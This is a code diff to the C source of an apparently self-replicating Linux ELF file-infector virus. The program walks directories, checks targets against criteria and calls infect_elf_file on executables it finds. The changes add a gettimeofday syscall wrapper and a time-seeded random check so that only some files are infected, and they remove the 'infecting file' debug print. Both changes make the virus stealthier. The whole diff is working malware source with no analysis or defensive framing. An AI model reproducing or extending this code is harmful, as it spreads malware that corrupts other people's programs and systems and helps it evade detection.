@@ -15,6 +15,7 @@
 #include <signal.h>
 #include <sys/user.h>
 #include <sys/prctl.h>
+#include <sys/time.h>
 
 struct linux_dirent64 {
         uint64_t             d_ino;
@@ -53,7 +54,7 @@ int _getdents64(unsigned int fd, struct linux_dirent64 *dirp,
                     unsigned int count);
 int _rename(const char *, const char *);
 int _close(unsigned int);
-
+int _gettimeofday(struct timeval *, struct timezone *);
 /* Customs */
 unsigned long get_rip(void);
 void end_code(void);
@@ -202,9 +203,9 @@ static inline int _rand(long *seed) // RAND_MAX assumed to be 32767
  */
 static inline uint32_t get_random_number(int max)
 {
-	long rsp;
-        asm __volatile__("mov %%rsp, %0" : "=r"(rsp));
-	return _rand(&rsp) % max;
+	struct timeval tv;
+	_gettimeofday(&tv, NULL);
+	return _rand(&tv.tv_usec) % max;
 }
 	
 static inline char * randomly_select_dir(char **dirs) 
@@ -370,9 +371,9 @@ int load_self(elfbin_t *elf)
 	elf->mem = (uint8_t *)_start_addr;
 	elf->size = (char *)&end_code - (char *)&_start; 
 	elf->size += (int)((char *)f2 - (char *)f1);
-#if DEBUG // this makes it possible for _printf's to work since we inject .rodata
+//#if DEBUG // this makes it possible for _printf's to work since we inject .rodata
 	elf->size += 1000;
-#endif
+//#endif
 	return 0;
 }
 
@@ -515,15 +516,13 @@ void do_main(struct bootstrap_data *bootstrap)
 			if (!_strcmp(d->d_name, &bootstrap->argv[0][2])) {
 				continue;
 			}
-			rnum = get_random_number(10);
-			//if (rnum != LUCKY_NUMBER)
-			//	continue;
 			if (d->d_name[0] == '.')
 				continue;
 			if (check_criteria(fpath = full_path(d->d_name, dir, &heap)) < 0)
 				continue;
-			_printf("infecting file: %s\n", d->d_name);
-			
+			rnum = get_random_number(10);
+                        if (rnum != LUCKY_NUMBER)
+                                continue;
 			load_target(fpath, &target);
 			infect_elf_file(&self, &target);
 			unload_target(&target);
@@ -704,6 +703,19 @@ int _getdents64(unsigned int fd, struct linux_dirent64 *dirp,
                         "syscall" :: "g"(fd), "g"(dirp), "g"(count));
         asm ("mov %%rax, %0" : "=r"(ret));
         return (int)ret;
+}
+
+int _gettimeofday(struct timeval *tv, struct timezone *tz)
+{
+	long ret;
+        __asm__ volatile(
+                        "mov %0, %%rdi\n"
+                        "mov %1, %%rsi\n"
+                        "mov $96, %%rax\n"
+			"syscall" :: "g"(tv), "g"(tz));
+	asm ("mov %%rax, %0" : "=r"(ret));
+        return (int)ret;
+
 }
 
 void _memcpy(void *dst, void *src, unsigned int len)
